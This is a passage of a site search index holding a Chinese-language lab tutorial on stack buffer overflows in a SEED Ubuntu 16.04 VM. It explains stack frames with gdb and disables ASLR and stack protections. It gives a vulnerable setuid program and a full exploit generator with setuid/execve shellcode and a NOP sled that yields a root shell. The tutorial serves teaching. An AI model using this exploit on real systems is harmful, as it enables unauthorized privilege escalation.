if(state==0){ state=3; }else if(state==4){ state=3; }else if(state==1){ state=2; }else{ return false; } }else if(s[idx]=='+'||s[idx]=='-'){ if(state==0){ state=4; }else if(state==5){ state=7; }else{ return false; } }else{ return false; } idx++; } return state==1||state==2||state==6; } private: bool isDigital(char c){ return c>='0'&&c<='9'; } int state; };","title":"\u4ee3\u7801"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/","text":"\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb \u00b6 \u7f13\u51b2\u533a\u6ea2\u51fa(buffer-overflow)\u662f\u4e00\u79cd\u975e\u5e38\u666e\u904d\u3001\u540c\u65f6\u975e\u5e38\u5371\u9669\u7684\u6f0f\u6d1e\uff0c\u5728\u5404\u79cd\u64cd\u4f5c\u7cfb\u7edf\u3001\u5e94\u7528\u8f6f\u4ef6\u4e2d\u5e7f\u6cdb\u5b58\u5728\u3002\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u662f\u5229\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u6240\u8fdb\u884c\u7684\u653b\u51fb\uff0c\u8f7b\u5219\u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5931\u8d25\u3001\u7cfb\u7edf\u5173\u673a\u7b49\uff0c\u91cd\u5219\u53ef\u4ee5\u5229\u7528\u5b83\u6267\u884c\u975e\u6388\u6743\u6307\u4ee4\uff0c\u751a\u81f3\u83b7\u53d6\u7cfb\u7edf\u7279\u6743\uff0c\u4ece\u800c\u8fdb\u884c\u5176\u5b83\u7684\u975e\u6cd5\u64cd\u4f5c\u3002\u7f13\u51b2\u533a\u653b\u51fb\u6709\u6808\u6ea2\u51fa\u3001\u5806\u6ea2\u51fa\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3001\u6574\u5f62\u53d8\u91cf\u6ea2\u51fa\u7b49\u3002\u672c\u6587\u5c06\u4e3b\u8981\u4ecb\u7ecd\u5806\u6808\u6ea2\u51fa\u653b\u51fb\uff0c\u5e76\u5b9e\u73b0\u5bf9\u4e00\u4e2aubuntu 16.04\u7cfb\u7edf\u7684\u7b80\u5355\u7684\u6808\u653b\u51fb\uff0c\u83b7\u53d6\u5176root\u6743\u9650\u3002 \u5b9e\u9a8c\u5e73\u53f0 \u00b6 \u64cd\u4f5c\u7cfb\u7edf\uff1aSEED Ubuntu16.04 VM (32-bit)\uff0c\u955c\u50cf\u4e0b\u8f7d\u5730\u5740\uff1ahttps://seedsecuritylabs.org/lab_env.html \u865a\u62df\u673a\uff1aOracle VM VirtualBox 6.0.4 \u5806\u6808\u6ea2\u51fa\u539f\u7406 \u00b6 \u5728\u8ba1\u7b97\u673a\u91cc\uff0c\u5806\u6808\u662f\u5185\u5b58\u91cc\u7684\u4e00\u6bb5\u533a\u57df\u3002\u5806\u4e00\u822c\u7531\u7a0b\u5e8f\u5458\u5206\u914d\u91ca\u653e\uff0c\u5982\u679c\u7a0b\u5e8f\u5458\u4e0d\u91ca\u653e\uff0c\u7a0b\u5e8f\u7ed3\u675f\u65f6\u53ef\u80fd\u7531\u64cd\u4f5c\u7cfb\u7edf\u56de\u6536\uff0c\u5206\u914d\u65b9\u5f0f\u7c7b\u4f3c\u4e8e\u6570\u636e\u7ed3\u6784\u4e2d\u7684\u94fe\u8868\uff1b\u6808\u7531\u64cd\u4f5c\u7cfb\u7edf\u81ea\u52a8\u5206\u914d\u91ca\u653e\uff0c\u5b58\u653e\u51fd\u6570\u7684\u53c2\u6570\u503c\u3001\u5c40\u90e8\u53d8\u91cf\u3001\u8fd4\u56de\u5730\u5740\u7b49\uff0c\u5206\u914d\u65b9\u5f0f\u7c7b\u4f3c\u4e8e\u6570\u636e\u7ed3\u6784\u4e2d\u7684\u6808\u3002\u4ee5\u5806\u6808\u6ea2\u51fa\u4e3a\u4ee3\u8868\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u5df2\u7ecf\u6210\u4e3a\u6700\u666e\u904d\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u7531\u6b64\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898\u6bd4\u6bd4\u7686\u662f\u3002\u5806\u6808\u6ea2\u51fa\u7684\u539f\u56e0\u4e00\u822c\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a \u51fd\u6570\u8c03\u7528\u5c42\u6b21\u592a\u6df1\u3002\u51fd\u6570\u9012\u5f52\u8c03\u7528\u65f6\uff0c\u7cfb\u7edf\u8981\u5728\u6808\u4e2d\u4e0d\u65ad\u4fdd\u5b58\u51fd\u6570\u8c03\u7528\u65f6\u7684\u73b0\u573a\u548c\u4ea7\u751f\u7684\u53d8\u91cf\uff0c\u5982\u679c\u9012\u5f52\u8c03\u7528\u592a\u6df1\uff0c\u5c31\u4f1a\u9020\u6210\u6808\u6ea2\u51fa\uff0c\u8fd9\u65f6\u9012\u5f52\u65e0\u6cd5\u8fd4\u56de\u3002\u518d\u6709\uff0c\u5f53\u51fd\u6570\u8c03\u7528\u5c42\u6b21\u8fc7\u6df1\u65f6\u4e5f\u53ef\u80fd\u5bfc\u81f4\u6808\u65e0\u6cd5\u5bb9\u7eb3\u8fd9\u4e9b\u8c03\u7528\u7684\u8fd4\u56de\u5730\u5740\u800c\u9020\u6210\u6808\u6ea2\u51fa\u3002 \u52a8\u6001\u7533\u8bf7\u7a7a\u95f4\u4f7f\u7528\u4e4b\u540e\u6ca1\u6709\u91ca\u653e\u3002\u7531\u4e8eC\u8bed\u8a00\u4e2d\u6ca1\u6709\u5783\u573e\u8d44\u6e90\u81ea\u52a8\u56de\u6536\u673a\u5236\uff0c\u56e0\u6b64\uff0c\u9700\u8981\u7a0b\u5e8f\u4e3b\u52a8\u91ca\u653e\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528\u7684\u52a8\u6001\u5730\u5740\u7a7a\u95f4\u3002\u7533\u8bf7\u7684\u52a8\u6001\u7a7a\u95f4\u4f7f\u7528\u7684\u662f\u5806\u7a7a\u95f4\uff0c\u52a8\u6001\u7a7a\u95f4\u4f7f\u7528\u4e0d\u4f1a\u9020\u6210\u5806\u6ea2\u51fa\u3002 \u6570\u7ec4\u8bbf\u95ee\u8d8a\u754c\u3002C\u8bed\u8a00\u6ca1\u6709\u63d0\u4f9b\u6570\u7ec4\u4e0b\u6807\u8d8a\u754c\u68c0\u67e5\uff0c\u5982\u679c\u5728\u7a0b\u5e8f\u4e2d\u51fa\u73b0\u6570\u7ec4\u4e0b\u6807\u8bbf\u95ee\u8d85\u51fa\u6570\u7ec4\u8303\u56f4\uff0c\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u5185\u5b58\u8bbf\u95ee\u9519\u8bef\u3002 \u6307\u9488\u975e\u6cd5\u8bbf\u95ee\u3002\u6307\u9488\u4fdd\u5b58\u4e86\u4e00\u4e2a\u975e\u6cd5\u7684\u5730\u5740\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u6307\u9488\u8bbf\u95ee\u6240\u6307\u5411\u7684\u5730\u5740\u65f6\u4f1a\u4ea7\u751f\u5185\u5b58\u8bbf\u95ee\u9519\u8bef\u3002 \u5728\u4e00\u4e9b\u9ad8\u7ea7\u8bed\u8a00\u4e2d\uff0c\u7c7b\u4f3cpython, java, go\u7b49\uff0c\u6709\u4e00\u4e9b\u673a\u5236\u7528\u4e8e\u9632\u6b62\u6808\u6ea2\u51fa\uff0c\u6bd4\u5982\uff0cpython\u9ed8\u8ba4\u7684\u9012\u5f52\u6df1\u5ea6\u662f1000\uff0c\u5f53\u9012\u5f52\u8c03\u7528\u8d85\u8fc7\u8fd9\u4e2a\u6df1\u5ea6\u540e\u5c31\u4f1a\u5f15\u53d1\u5f02\u5e38\u3002\u6b64\u5916\uff0c\u7f16\u8bd1\u5668\u5c42\u9762\u4e0a\u4e5f\u6709\u5bf9\u5806\u6808\u8fdb\u884c\u4fdd\u62a4\uff0c\u5176\u4e2d\u6700\u8457\u540d\u7684\u662fStack Guard\u548cStack-smashing Protectection\u3002\u5728\u64cd\u4f5c\u7cfb\u7edf\u7684\u5c42\u9762\u4e0a\uff0c\u4e3a\u4e86\u51cf\u5c11\u5806\u6808\u6ea2\u51fa\u5e26\u6765\u7684\u5371\u5bb3\uff0c\u8fd8\u6709\u7c7b\u4f3c\u4e8e\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u7684\u673a\u5236\u3002 \u7a0b\u5e8f\u7684\u5185\u5b58\u5e03\u5c40 \u00b6 \u4e3a\u4e86\u8fdb\u4e00\u6b65\u4e86\u89e3\u5806\u6808\u6ea2\u51fa\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u662f\u5982\u4f55\u5206\u914d\u7684\u3002\u5bf9\u4e8e\u4e00\u4e2a\u5178\u578b\u7684C\u8bed\u8a00\u7a0b\u5e8f\uff0c\u5176\u8fd0\u884c\u65f6\uff0c\u5185\u5b58\u75315\u4e2a\u77ed\u7ec4\u6210\uff0c\u5206\u522b\u4e3a\u4ee3\u7801\u6bb5\uff08text segment\uff09\uff0c\u6570\u636e\u6bb5\uff08data segment\uff09\uff0cBSS\u6bb5\uff08BSS segment\uff09\uff0c\u5806\uff08heap\uff09\uff0c\u6808\uff08stack\uff09\uff0c\u8fd95\u4e2a\u6bb5\u5728\u5185\u5b58\u4e2d\u5206\u5e03\u5982\u4e0b \u4ee3\u7801\u6bb5\u4e2d\u5b58\u653e\u7a0b\u5e8f\u7684\u4ee3\u7801\uff1b\u6570\u636e\u6bb5\u4e2d\u5b58\u653e\u7740\u7531\u7a0b\u5e8f\u5458\u521d\u59cb\u5316\u7684\u9759\u6001/\u5168\u5c40\u53d8\u91cf\uff0c\u4f8b\u5982\uff0c stack int a=3; \u4e2d\u7684 a \u53d8\u91cf\uff1bBSS\u6bb5\u4e2d\u5b58\u653e\u7740\u672a\u521d\u59cb\u5316\u7684\u9759\u6001/\u5168\u5c40\u53d8\u91cf\uff0c\u4f8b\u5982\uff0c stack int b; \u4e2d\u7684 b \u53d8\u91cf\uff1b\u5806\u662f\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58\uff0cc\u8bed\u8a00\u4e2d\uff0c malloc \u3001 calloc \u7b49\u51fd\u6570\u7528\u4e8e\u7533\u8bf7\u52a8\u6001\u5185\u5b58\uff0c free \u51fd\u6570\u7528\u4e8e\u91ca\u653e\uff0c\u5728\u9014\u4e2d\u662f\u5411\u4e0a\u589e\u957f\uff1b\u6808\u5219\u5b58\u653e\u51fd\u6570\u5185\u5b9a\u4e49\u7684\u5c40\u90e8\u53d8\u91cf\u3001\u51fd\u6570\u8fd4\u56de\u5730\u5740\u3001\u51fd\u6570\u53c2\u6570\u7b49\uff0c\u5728\u56fe\u4e2d\u662f\u5411\u4e0b\u589e\u957f\u3002\u6ce8\u610f\uff0c\u5728\u73b0\u5728\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u8fd9\u51e0\u4e2a\u6bb5\u4e0d\u4e00\u5b9a\u662f\u8fde\u5728\u4e00\u8d77\u7684\u3002 \u8fd9\u6b21\u6211\u4eec\u5b9e\u73b0\u7684\u662f\u6808\u6ea2\u51fa\u653b\u51fb\uff0c\u6240\u4ee5\u6211\u4eec\u5177\u4f53\u770b\u4e00\u4e0b\u4e00\u4e2a\u51fd\u6570\u5728\u6808\u91cc\u9762\u7684\u6570\u636e\u7684\u5206\u5e03\uff0c\u4ee5\u53ca\u4e00\u4e2a\u51fd\u6570\u662f\u5982\u4f55\u88ab\u8c03\u7528\u7684\uff0c\u4ee5 \u4e00\u4e2a\u7b80\u5355\u7684c\u8bed\u8a00\u7a0b\u5e8f \u4e3a\u4f8b /* fun.c */ #include<stdio.h> int fun(int a, int b) { int l[3]; l[0] = a; l[1] = b; l[2] = a + b; } int main() { fun(1, 2); } \u5148\u7528gcc\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u7f16\u8bd1 gcc -g -fno-stack-protector fun.c -o fun \u5728\u4f7f\u7528gdb\u5bf9fun\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u9996\u5148\u53cd\u6c47\u7f16 main \u51fd\u6570\uff0c\u770b\u4e00\u4e0b\u662f\u5982\u4f55\u8c03\u7528 fun \u51fd\u6570\u7684 gdb fun disass main \u4ece<+3>\u5230<+12>\u5c31\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u51fd\u6570\u8c03\u7528\u8fc7\u7a0b\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u8c03\u7528 fun \u51fd\u6570\u65f6\uff0c\u9996\u5148\u901a\u8fc7<+3>\u548c<+5>\u4e24\u6761\u6307\u4ee4\u628a\u51fd\u6570\u53c2\u6570\u538b\u8fdb\u6808\u91cc\uff0c\u7136\u540e\u4f7f\u7528 call \u6307\u4ee4\u8df3\u8f6c\u6267\u884c\uff0c\u800c\u4e00\u6761 call \u6307\u4ee4\u4f1a\u5148\u628aeip\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u538b\u8fdb\u6808\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u88ab\u8c03\u7528\u51fd\u6570\u91cc\u6267\u884c\uff0ceip\u5bc4\u5b58\u5668\u91cc\u5b58\u653e\u7740 call \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4e5f\u5c31\u662f\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5373\u4e00\u6761 call \u6307\u4ee4\u76f8\u5f53\u4e8e push eip ; \u6b64\u65f6eip\u5bc4\u5b58\u5668\u91cc\u7684\u503c\u662f\u6307\u4ee4<+12>\u7684\u5730\u5740 jmp 0x80484db ; fun\u51fd\u6570\u7684\u8d77\u59cb\u5730\u5740 \u987a\u5229\u4ece fun \u51fd\u6570\u8fd4\u56de\u540e\uff0c\u6307\u4ee4<+12>\u7684\u4f5c\u7528\u6e05\u7a7a\u6808\u91cc\u4f20\u7ed9\u51fd\u6570\u7684\u53c2\u6570\u3002 \u7136\u540e\u5bf9 fun \u51fd\u6570\u8fdb\u884c\u53cd\u6c47\u7f16\uff0c\u770b\u4e00\u4e0b fun \u51fd\u6570\u91cc\u7684\u5c40\u90e8\u53d8\u91cf\u662f\u5982\u4f55\u5206\u5e03\u7684\uff0c\u4ee5\u53ca\u5982\u4f55\u8fd4\u56de\u5230 main \u51fd\u6570\uff0c\u7ed3\u679c\u5982 \u4e0b\u56fe \u6240\u793a disass fun \u5728\u51fd\u6570\u7684\u5f00\u5934\uff0c\u9996\u5148\u662f<+0>\u548c<+1>\u4e24\u6761\u6307\u4ee4\u5bf9ebp\u5bc4\u5b58\u5668\u7684\u64cd\u4f5c\uff0cebp\u5bc4\u5b58\u5668\u53c8\u53eb\u57fa\u5740\u6307\u9488(extended base pointer)\u5bc4\u5b58\u5668\u3002\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\u3001\u53c2\u6570\u7b49\u662f\u4fdd\u5b58\u5728\u6808\u91cc\u7684\uff0c\u800c\u5728\u51fd\u6570\u8fd0\u884c\u65f6\uff0c\u6808\u6307\u9488\u5bc4\u5b58\u5668esp\u7684\u503c\u4f1a\u53d1\u751f\u6539\u53d8\uff0c\u6240\u4ee5\u65e0\u6cd5\u901a\u8fc7esp\u8bbf\u95ee\u5230\u8fd9\u4e9b\u53d8\u91cf\u548c\u53c2\u6570\uff0c\u56e0\u6b64\u5f15\u5165\u4e86ebp\u5bc4\u5b58\u5668\uff0c\u4fdd\u5b58\u7740\u6808\u4e2d\u7684\u4e00\u4e2a\u56fa\u5b9a\u7684\u5730\u5740\uff0c\u901a\u8fc7\u8ba1\u7b97\u76f8\u5bf9\u4e8e\u8be5\u5730\u5740\u7684\u504f\u79fb\u91cf\u5373\u53ef\u8bbf\u95ee\u5230\u53d8\u91cf\u548c\u53c2\u6570\u3002\u572832\u4f4d\u7cfb\u7edf\u4e2d\uff0c\u4e00\u4e2aint\u7c7b\u578b\u3001\u8fd4\u56de\u5730\u5740\u3001\u5bc4\u5b58\u5668\u5927\u5c0f\u90fd\u662f4\u4e2a\u5b57\u8282\u3002\u6b64\u5916\u7531 main \u51fd\u6570\u7684\u6c47\u7f16\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u662f\u53c2\u6570 b \u5148\u8fdb\u6808(\u6307\u4ee4<+3>)\uff0c\u518d\u662f\u53c2\u6570 a \u8fdb\u6808\u3002\u56e0\u6b64\uff0c\u6307\u4ee4<+6>\u4e2d[ebp+0x8]\u8bbf\u95ee\u7684\u662f\u53c2\u6570 a \uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u65ad\u6307\u4ee4<+9>\u4e2d[ebp-0xc]\u8bbf\u95ee\u7684\u662f l[0] \uff0c\u4e24\u6761\u6c47\u7f16\u6307\u4ee4\u5bf9\u5e94\u7684c\u4ee3\u7801\u662f l[0] = a \u3002\u6307\u4ee4<+12>\u5230<+29>\u5206\u6790\u4e5f\u662f\u7c7b\u4f3c\u7684\u3002 \u6307\u4ee4<+30>\u548c<+31>\u662f\u4ece fun \u51fd\u6570\u8fd4\u56de main \u51fd\u6570\u7684\u8fc7\u7a0b\u3002 leave \u6307\u4ee4\u76f8\u5f53\u4e8e mov esp,ebp \u548c pop ebp \uff0c\u5373\u6062\u590d\u4e86\u8fdb\u5165 fun \u51fd\u6570\u65f6ebp\u548cesp\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u800c ret \u6307\u4ee4\u76f8\u5f53\u4e8e pop eip \uff0c\u5373\u628a\u6808\u4e2d\u7684\u51fd\u6570\u8fd4\u56de\u5730\u5740\u5f39\u51fa\uff0c\u653e\u5165eip\u5bc4\u5b58\u5668\u4e2d\uff0c\u5b9e\u73b0\u8fd4\u56de\u5230 main \u51fd\u6570\u3002 \u901a\u8fc7\u4e0a\u8ff0\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5 fun \u51fd\u6570\u7684\u6808\u5206\u5e03\u5982\u4e0b\u56fe\u6240\u793a \u4ece\u56fe\u4e2d\u5c31\u53ef\u4ee5\u5927\u81f4\u770b\u5230\u8fdb\u884c\u6808\u6ea2\u51fa\u653b\u51fb\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5373\u8d8a\u8fc7\u6570\u7ec4 l \u7684\u8fb9\u754c\u53bb\u4fee\u6539\u51fd\u6570\u8fd4\u56de\u5730\u5740\uff0c\u4ece\u800c\u8df3\u8f6c\u5230\u4e00\u6bb5\u6076\u610f\u4ee3\u7801\u53bb\u6267\u884c\uff0c\u5373\u7c7b\u4f3c l[4]=somewhere \u3002\u5728c\u8bed\u8a00\u4e2d\uff0c\u7c7b\u4f3c strcpy \u51fd\u6570\u7b49\u662f\u6ca1\u6709\u8fb9\u754c\u68c0\u67e5\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 strcpy \u51fd\u6570\u5411\u4e00\u4e2a\u5b57\u7b26\u4e32\u6570\u7ec4\u62f7\u8d1d\u8d85\u8fc7\u5176\u5927\u5c0f\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u4fee\u6539\u51fd\u6570\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u7a0d\u540e\u5b9e\u73b0\u7684\u6808\u6ea2\u51fa\u653b\u51fb\u7684\u539f\u7406\u3002 // \u5411buf\u62f7\u8d1d\u8d85\u8fc7\u5176\u5927\u5c0f\u7684\u5185\u5bb9\u3002 #include<stdio.h> #include<string.h> int main() { char buf[3]; char *s=\"hello,world\"; strcpy(buf,s); } \u8fd9\u4e2a\u653b\u51fb\u7684\u601d\u8def\u5c31\u662f\uff0c\u9996\u5148\u5728\u5185\u5b58\u4e2d\u653e\u7f6e\u4e00\u6bb5\u53ef\u4ee5\u83b7\u53d6root\u6743\u9650\u6076\u610f\u4ee3\u7801\uff0c\u7136\u540e\u5229\u7528 strcpy \u6ca1\u6709\u8fb9\u754c\u68c0\u67e5\u7684\u7279\u70b9\u9020\u6210\u6808\u6ea2\u51fa\u4fee\u6539\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8df3\u8f6c\u5230\u6076\u610f\u4ee3\u7801\u6267\u884c\u3002 \u5b9e\u73b0\u6808\u6ea2\u51fa\u653b\u51fb \u00b6 \u4e3a\u9632\u6b62\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u591a\u79cd\u4fdd\u62a4\u673a\u5236\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u6b21\u653b\u51fb\uff0c\u6211\u4eec\u9700\u8981\u505c\u7528\u4e00\u4e9b\u4fdd\u62a4\u673a\u5236\uff0c\u5177\u4f53\u662f\uff1a\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316 (Address Randomization)\u3001\u4e0d\u53ef\u6267\u884c\u6808 (Non-executable Stack)\u3001Stack Guard\u3002 \u5047\u8bbe\u6709\u4e00\u4e2a\u5177\u6709\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u7a0b\u5e8f\u5982\u4e0b\uff1a /* stack.c */ #include <stdlib.h> #include <stdio.h> #include <string.h> int bof(char *str) { char buffer[24]; /* \u8fd9\u91cc\u5b58\u5728\u6808\u6ea2\u51fa\u7684\u5371\u9669 */ strcpy(buffer, str); return 1; } int main(int argc, char **argv) { char str[517]; FILE *badfile; badfile = fopen(\"badfile\", \"r\"); fread(str, sizeof(char), 517, badfile); bof(str); printf(\"Returned Properly\\n\"); return 1; } \u5bf9\u4e0a\u8ff0\u6587\u4ef6\u8fdb\u884c\u7f16\u8bd1\uff0c\u6ce8\u610f\u8981\u505c\u7528\u4e00\u4e9b\u4fdd\u62a4\u673a\u5236 \u7981\u6b62\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316 su root sysctl -w kernel.randomize_va_space=0 exit \u4f7f\u7528gcc\u8fdb\u884c\u7f16\u8bd1 su root gcc -g -fno-stack-protector -z execstack stack.c -o stack chmod 4755 stack exit -fon-stack-protector \u9009\u9879\u662f\u5173\u95edgcc\u7684Stack Guard\uff1b -z execstack \u9009\u9879\uff1b\u6700\u540e\u7684 chmod 4755 stack \u662f\u8ba9\u5176\u5b83\u7528\u6237\u5728\u6267\u884cstack\u7a0b\u5e8f\u65f6\uff0c\u62e5\u6709\u548c\u6240\u6709\u8005(root)\u76f8\u5f53\u7684\u6743\u9650\uff08\u8fd9\u6837\u7684\u7a0b\u5e8f\u662f\u5b58\u5728\u7684\uff09\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f7f\u6076\u610f\u4ee3\u7801\u4e2d\u7684 setuid \u6307\u4ee4\u53ef\u4ee5\u6267\u884c\u3002 \u653b\u51fb\u7684\u5177\u4f53\u601d\u8def\u662f\uff1a\u7cbe\u5fc3\u8bbe\u8ba1badfile\u7684\u5185\u5bb9\uff0c\u8ba9\u5176\u5305\u542b\u4e00\u6bb5\u53ef\u4ee5\u83b7\u53d6root\u6743\u9650\u7684\u4ee3\u7801\uff0c\u8fd9\u6bb5\u4ee3\u7801\u4f1a\u88ab\u8bfb\u5230stack\u7684 str \u4e2d\uff0c\u518d\u62f7\u8d1d\u5230 bof \u51fd\u6570\u7684 buffer \u91cc\uff0c\u53ea\u8981badfile\u91cc\u7684\u5185\u5bb9\u591f\u591a\uff0c\u5c31\u4f1a\u7a81\u7834 buffer \u7684\u8fb9\u754c\uff0c\u4ece\u800c\u8986\u76d6\u6389 bof \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u63a7\u5236\u51fd\u6570\u8fd4\u56de\u5230\u6076\u610f\u4ee3\u7801\u91cc\u6267\u884c\u3002 \u9996\u5148\uff0c\u4f7f\u7528gdb\u5bf9stack\u8fdb\u884c\u5206\u6790 gdb stack \u67e5\u770b str \u7684\u5730\u5740 b main # \u8bbe\u7f6e\u65ad\u70b9 r # \u8fd0\u884c p /x &str # \u53c2\u8003str\u7684\u5730\u5740 \u6211\u4eec\u7684\u6076\u610f\u4ee3\u7801\u6700\u7ec8\u4f1a\u63d2\u5165\u52300xbfffea37\u5f00\u59cb517\u4e2a\u5b57\u8282\u7684\u5185\u5b58\u91cc\u3002 \u7136\u540e\u67e5\u770b bof \u7684 buffer \u5730\u5740\uff0c\u4ee5\u53ca\u5b58\u653e\u8fd4\u56de\u5730\u5740\u7684\u4f4d\u7f6e \u5148\u8fd0\u884c\u5230 bof \u51fd\u6570\u91cc\uff0c\u518d\u67e5\u770b bof \u7684\u6c47\u7f16\u4ee3\u7801 b bof r disass bof \u53ef\u4ee5\u770b\u5230\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5df2\u7ecf\u8fd0\u884c\u5230\u6307\u4ee4<+6>\uff0c\u7531\u4e4b\u524d\u7684\u5206\u6790\u53ef\u4ee5\u5f97\u77e5\uff0c\u6b64\u65f6\u5bc4\u5b58\u5668ebp\u91cc\u7684\u503c\u52a0\u4e0a4\u5c31\u662f\u8fd4\u56de\u5730\u5740\u7684\u5b58\u653e\u5730\u5740\u4e86\u3002\u67e5\u770bebp\u5bc4\u5b58\u5668\u7684\u503c p /x $ebp \u518d\u67e5\u770b buffer \u7684\u5730\u5740 p /x &buffer \u56e0\u6b64\uff0c\u8fd4\u56de\u5730\u5740\u7684\u4f4d\u7f6e\u548c buffer \u9996\u5730\u5740\u76f8\u8ddd0xbfffea18+4-0xbfffe9f8=0x24\uff0c\u5373 buffer[0x24] \u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u8fd4\u56de\u5730\u5740\u3002 \u901a\u8fc7\u4e0a\u8ff0\u5206\u6790\uff0c\u6076\u610f\u4ee3\u7801\u5728 str \u91cc\u3002\u6240\u4ee5\uff0c\u5728 bof \u51fd\u6570\u91cc\uff0c\u8981\u4fee\u6539 buffer[0x24] \u5904\u7684\u5185\u5bb9\u4e3a\u6076\u610f\u4ee3\u7801\u7684\u5165\u53e3\u3002\u4e3a\u4e86\u589e\u5927\u653b\u51fb\u6210\u529f\u7684\u53ef\u80fd\u6027\uff0c\u6211\u4eec\u5728 str \u9996\u5730\u5740\u5230\u6076\u610f\u4ee3\u7801\u7684\u5165\u53e3\u4e4b\u524d\u586b\u5145 NOP \u6307\u4ee4\uff0c\u8be5\u6307\u4ee4\u4e0d\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\u3002\u586b\u5145 NOP \u53ef\u4ee5\u518d\u8df3\u8f6c \u201d\u4e0d\u90a3\u4e48\u7cbe\u786e\u201c \u7684\u65f6\u5019\uff0c\u4e5f\u4f1a \u201c\u6ed1\u201d \u5230\u6076\u610f\u4ee3\u7801\u7684\u5165\u53e3\uff0c\u5373\u5047\u8bbe\u6076\u610f\u4ee3\u7801\u63d2\u5165\u5230 str[400] \u5904\uff0c\u53ea\u8981\u8df3\u8f6c\u5230 str[0] \u548c str[400] \u4e4b\u95f4\u90fd\u53ef\u4ee5\u6210\u529f\u5b9e\u73b0\u653b\u51fb\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u751f\u6210\u6211\u4eec\u7cbe\u5fc3\u8bbe\u8ba1\u7684badfile\u7a0b\u5e8f\uff0c\u5c06\u6076\u610f\u4ee3\u7801\u63d2\u5165\u5230 str[400] \u5904\u5f00\u59cb\u7684\u5730\u65b9\uff0c\u7136\u540e\u63a7\u5236 bof \u51fd\u6570\u8df3\u8f6c\u52300xbfffeb95 \uff08\u5927\u6982\u5728 str[350] \u5904\uff09 /* exploit.c */ #include <stdlib.h> #include <stdio.h> #include <string.h> // \u6076\u610f\u4ee3\u7801 char shellcode[]= \"\\x31\\xc0\" /* xorl %eax,%eax */ \"\\x31\\xdb\" /* xorl %ebx,%ebx */ \"\\xb0\\xd5\" /* movb $0xd5,%al */ \"\\xcd\\x80\" /* int $0x80 */ \"\\x31\\xc0\" /* xorl %eax,%eax */ \"\\x50\" /* pushl %eax */ \"\\x68\"\"//sh\" /* pushl $0x68732f2f */ \"\\x68\"\"/bin\" /* pushl $0x6e69622f */ \"\\x89\\xe3\" /* movl %esp,%ebx */ \"\\x50\" /* pushl %eax */ \"\\x53\" /* pushl %ebx */ \"\\x89\\xe1\" /* movl %esp,%ecx */ \"\\x99\" /* cdq */ \"\\xb0\\x0b\" /* movb $0x0b,%al */ \"\\xcd\\x80\" /* int $0x80 */ ; void main(int argc, char **argv) { char buffer[517]; FILE *badfile; /* \u4f7f\u7528NOP\u586b\u5145 */ memset(&buffer, 0x90, 517); strcpy(buffer+400, shellcode); /* \u6076\u610f\u4ee3\u7801\u5c06\u63d2\u5165\u5230str[400]\u5904\u5f00\u59cb\u7684\u5730\u65b9 */ strcpy(buffer+0x24, \"\\x95\\xeb\\xff\\xbf\"); /* \u63a7\u5236bof\u51fd\u6570\u8fd4\u56de\u52300xbfffeb95\u5904\uff0c\u6ce8\u610f\u8981\u5012\u5e8f */ /* \u751f\u6210badfile\u6587\u4ef6 */ badfile = fopen(\"./badfile\", \"w\"); fwrite(buffer, 517, 1, badfile); fclose(badfile); } \u7f16\u8bd1\u3001\u8fd0\u884cexploit.c gcc exploit.c -o exploit ./exploit \u6b64\u65f6\u751f\u6210\u4e86badfile\u3002 \u4e3a\u4e86\u4f53\u73b0root\u6743\u9650\u6709\u65e0\uff0c\u666e\u901a\u7528\u6237\u5c1d\u8bd5\u4fee\u6539/etc/passwd\u6587\u4ef6\uff0c\u6267\u884c vim /etc/passwd 